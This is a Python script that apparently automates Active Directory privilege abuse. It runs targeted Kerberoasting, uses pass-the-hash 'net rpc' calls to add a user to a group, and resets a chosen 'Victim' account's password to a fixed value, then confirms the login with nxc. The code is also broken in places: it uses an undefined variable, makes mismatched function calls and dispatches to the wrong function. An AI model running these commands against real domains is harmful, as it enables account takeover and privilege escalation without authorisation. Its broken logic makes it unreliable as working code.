import os
import subprocess
from argument_parser import parse_arguments  # Import the parse_arguments function from argument_parser.py

# Install missing dependencies if necessary
try:
    from colorama import Fore
except ImportError:
    os.system("sudo pip install colorama")

# Set colorama color constants
RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET
# Get the arguments from the argument_parser.py
args = parse_arguments()
# Extract arguments
DOMAIN = args.DomainName
USER = args.Username
PASS = args.Password
HASH = args.PassTheHash  

def whois_GW():
    """Prompt user to choose between group (g) or user (u)"""
    who = input(f"{CYAN}Write owner over group or user (g/u):{RED} ").strip().lower()
    return who  # Return the input value

def GWGH():
    tar = input(f"{CYAN}Group to add user to:{RED} {RESET}")
    subprocess.call([f"targetedKerberoast.py -v -d {DOMAIN} -u {USER} -H 00000000000000000000000000000000:{HASH}"], shell=True)
    subprocess.call([f"pth-net rpc group addmem {tar} {USER} -U {DOMAIN}/{USER}%00000000000000000000000000000000:{HASH} -S {DOMAIN}"], shell=True)
    
def GWGP():
    """Write owner over group with password"""
    tar = input(f"{CYAN}Group to add user to:{RED} {RESET}")
    subprocess.call([f"targetedKerberoast.py -v -d {DOMAIN} -u {USER} -p {PASS}"], shell=True)
    subprocess.call([f"net rpc group addmem {tar} {USER} -U {DOMAIN}/{USER}%{PASS} -S {DOMAIN}"], shell=True)

def GWUH():
    tar = input(f"{CYAN}Victim:{RED} {RESET}")
    subprocess.call([f"targetedKerberoast.py -v -d {DOMAIN} -u {USER} H 00000000000000000000000000000000:{HASH}"], shell=True)
    subprocess.call([f"pth-net rpc password {tar} 'P@ssw0rd123!@#' -U {DOMAIN}/{USER}%00000000000000000000000000000000:{HASH} -S {DOMAIN}"], shell=True)
    subprocess.call([f"nxc smb {DOMAIN} -u {tar} -p 'P@ssw0rd123!@#'"], shell=True)

def GWUP():
    """Write owner over group with password"""
    tar = input(f"{CYAN}Victim:{RED} {RESET}")
    subprocess.call([f"targetedKerberoast.py -v -d {DOMAIN} -u {USER} -p {PASS}"], shell=True)
    subprocess.call([f"net rpc password {tar} 'P@ssw0rd123!@#' -U {DOMAIN}/{USER}%{PASS} -S {DOMAIN}"], shell=True)
    subprocess.call([f"nxc smb {DOMAIN} -u {tar} -p 'P@ssw0rd123!@#'"], shell=True)

def main():
    # Check if the user input is valid
    if who_choice not in ['g', 'u']:
        print(f"{RED}Invalid input! Please choose 'g' or 'u'.")
        return  # Exit the program if input is invalid

    # Execute the appropriate function based on the parsed arguments
    if HASH:
        if who_choice == "g":
            GWGH(DOMAIN, USER, HASH)
        else:
            GWUP(DOMAIN, USER, HASH)
    else:
        if who_choice == "g":
            GWGP(DOMAIN, USER, PASS)
        else:
            GWUP(DOMAIN, USER, PASS)

if __name__ == '__main__':
    main()
